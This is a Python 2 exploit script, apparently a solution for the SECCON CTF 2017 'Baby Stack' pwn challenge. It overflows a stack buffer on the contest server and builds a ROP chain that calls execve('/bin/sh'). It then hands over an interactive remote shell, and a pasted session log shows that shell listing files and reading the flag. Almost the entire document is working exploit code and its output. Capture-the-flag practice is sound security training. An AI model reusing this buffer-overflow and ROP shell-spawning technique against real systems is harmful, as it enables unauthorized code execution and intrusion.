#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
# SECCON CTF 2017 - Baby Stack (pwn 100)
# --------------------------------------------------------------------------------------------------
import socket
import struct
import telnetlib
import string


# --------------------------------------------------------------------------------------------------
def recv_until(st):                                 # receive until you encounter a string
    ret = ""

    while st not in ret:
        ret += s.recv(8192)

    return ret


# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":
    s = socket.create_connection(('baby_stack.pwn.seccon.jp', 15285))
    #s = socket.create_connection(('localhost', 7777))

    recv_until(">>")                                # eat banner

    s.send('ispo' + '\n')
    recv_until(">>")

    print '[+] Sending ROP chain...'

    '''
    Here are our gadgets (found with ROPgadget + manually):
        .text:0000000000456889 0F 05    syscall
        .text:000000000045688B C3       retn

        .text:00000000004016EA 58       pop     rax
        .text:00000000004016EB C3       retn

        .text:000000000046DEFD 5E       pop     rsi
        .text:000000000046DEFE C3       retn

        .text:000000000043730F 5D       pop     rbp
        .text:0000000000437310 C3       retn

        0x00000000004108bf : pop rcx ; add al, 0 ; add rsp, 0x10 ; ret
        0x00000000004a247c : pop rdx ; or byte ptr [rax - 0x77], cl ; ret
        0x0000000000456499 : mov qword ptr [rdi], rax ; ret
        0x000000000044a282 : pop rdi ; adc eax, 0x24448900 ; and byte ptr [rcx], bh ; ret

    A safe place in .bss to write data (used as buf + argv):
        .bss:00000000005A1208 ?? ?? ?? ?? ?? ??+    align 20h

    Another place in .bss to write data (used as dump):
        .bss:00000000005A62E8 ?? ?? ?? ?? ?? ??+    align 20h
    '''

    payload  = 'A'*0x10                             # overflow buffer
    payload += '\x00' * 0x188                       # corrupt pointers with NULL to avoid segfaults

    # -------------------------------------------------------------------------
    # rdx gadget, writes to [rax - 0x77] and rdi gadget, writes to [rcx]
    #
    # set rax and rcx with valid writable addresses to avoid segfaults
    # -------------------------------------------------------------------------
    payload += struct.pack("<Q", 0x4108BF)          # & pop rcx; ...; retn
    payload += struct.pack("<Q", 0x5A62E8)          # rcx = 0x5A62E8 (a dummy address on .bss)
    payload += 'B'*0x10                             # padding
    payload += struct.pack("<Q", 0x4016EA)          # & pop rax; retn
    payload += struct.pack("<Q", 0x5A62E8)          # rax = 0x5A62E8 (same dummy address)

    # -------------------------------------------------------------------------
    # rdx = 0
    # -------------------------------------------------------------------------
    payload += struct.pack("<Q", 0x4a247c)          # & pop rdx; ...; retn
    payload += struct.pack("<Q", 0x0)               # rdx = 0

    # -------------------------------------------------------------------------
    # write &/bin/sh to .bss (argv buffer)
    # -------------------------------------------------------------------------
    payload += struct.pack("<Q", 0x44a282)          # & pop rdi; ...; retn
    payload += struct.pack("<Q", 0x5A1218)          # rdi = &argv (buf + 0x10)
    payload += struct.pack("<Q", 0x4016EA)          # & pop rax; retn
    payload += struct.pack("<Q", 0x5A1208)          # rax = &buf
    payload += struct.pack("<Q", 0x456499)          # [rdi] = rax -> *0x5A1208 = '/bin/sh\x00'
                                                    # .bss is already NULLed, so 0x5A1220 = 0

    # -------------------------------------------------------------------------
    # write /bin/sh to .bss
    # -------------------------------------------------------------------------
    payload += struct.pack("<Q", 0x44a282)          # & pop rdi; ...; retn
    payload += struct.pack("<Q", 0x5A1208)          # rdi = &buf
    payload += struct.pack("<Q", 0x4016EA)          # & pop rax; retn
    payload += '/bin/sh\x00'                        # rax = '/bin/sh\x00'
    payload += struct.pack("<Q", 0x456499)          # [rdi] = rax -> *0x5A1208 = '/bin/sh\x00'

    # -------------------------------------------------------------------------
    # rsi = argv (rdi is already set)
    # -------------------------------------------------------------------------
    payload += struct.pack("<Q", 0x46DEFD)          # & pop rsi; retn
    payload += struct.pack("<Q", 0x5A1218)          # rsi = & argv

    # -------------------------------------------------------------------------
    # call execve("/bin/sh", argv, NULL)
    # -------------------------------------------------------------------------
    payload += struct.pack("<Q", 0x4016EA)          # & pop rax; retn
    payload += struct.pack("<Q", 0x3b)              # rax = 59

    payload += struct.pack("<Q", 0x456889)          # & syscall; retn

    s.send(payload + '\n')
    s.recv(1024)


    print '[+] Opening Shell...'
    t = telnetlib.Telnet()                          # try to open shell
    t.sock = s
    t.interact()

# --------------------------------------------------------------------------------------------------
'''
ispo@nogirl:~/ctf/2017/seccon_ctf$ ./baby_stack_expl.py
    [+] Sending ROP chain...
    [+] Opening Shell...
    id
        uid=30761 gid=30000(baby_stack) groups=30000(baby_stack)
    date
        Tue Dec 12 16:06:45 JST 2017
    ls -la
        total 2464
        drwxr-x--- 2 root baby_stack    4096 Nov 28 18:36 .
        drwxr-xr-x 6 root root          4096 Nov 28 18:36 ..
        -rw-r----- 1 root baby_stack     220 Sep  1  2015 .bash_logout
        -rw-r----- 1 root baby_stack    3771 Sep  1  2015 .bashrc
        -rw-r----- 1 root baby_stack     655 May 16  2017 .profile
        -rwxr-x--- 1 root baby_stack 2496664 Nov 28 18:36 baby_stack
        -rw-r----- 1 root baby_stack      48 Nov 28 18:36 flag.txt
    cat flag.txt
        SECCON{'un54f3'm0dul3_15_fr13ndly_70_4774ck3r5}
    exit
    *** Connection closed by remote host ***
'''
# --------------------------------------------------------------------------------------------------
